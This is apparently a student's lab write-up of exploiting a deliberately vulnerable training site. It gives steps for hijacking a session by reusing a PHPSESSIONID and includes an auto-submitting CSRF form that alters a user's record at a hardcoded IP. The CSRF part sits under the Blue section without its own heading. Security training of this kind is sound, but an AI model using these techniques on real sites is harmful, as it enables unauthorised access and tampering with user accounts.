# Week 8 Project - Pentesting Live Targets

> Objective: Exploit vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits were:

    Username Enumeration
    Insecure Direct Object Reference (IDOR)
    SQL Injection (SQLi)
    Cross-Site Scripting (XSS)
    Cross-Site Request Forgery (CSRF)
    Session Hijacking

Each website had two of these vulnerabilities present, meaning all six could be found from the three websites.


## Blue:
### Vulnerability 1: Session Hijacking/Fixation
### Steps to recreate:
- In one browser (Firefox), log in normally and copy the current PHPSESSIONID.
- Use another browser (Microsoft Edge) which was NOT logged in and change the PHPSESSIONID we got from Firefox.
- It will show that it was automatically logged into the system in Edge without entering the password and username.

- User submit a feedback with a URL that links to the HTML page.
- Admin logs into the site and visits the attached feedback url.
- By visiting the page, it will attack and change the given salesperson's info.

```
<form name="csrfForm" action="http://35.184.88.145/red/public/staff/users/edit.php?id=1" method="POST">
	<input type="hidden" name="first_name" value="Fred" />
	<input type="hidden" name="last_name" value="Durst" />
	<input type="submit"/>
</form>
<script>
	document.csrfForm.submit();
</script>
```
